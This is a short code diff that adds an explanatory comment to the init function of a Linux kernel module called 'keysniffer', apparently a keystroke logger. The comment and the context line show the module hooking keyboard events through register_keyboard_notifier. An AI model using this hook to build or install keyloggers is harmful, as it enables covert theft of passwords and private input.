@@ -226,6 +226,11 @@ static int __init keysniffer_init(void)
 		return -ENOENT;
 	}
 
+	/*
+	 * Add to the list of console keyboard event
+	 * notifiers so the callback keysniffer_cb is
+	 * called when an event occurs.
+	 */
 	register_keyboard_notifier(&keysniffer_blk);
 	return 0;
 }
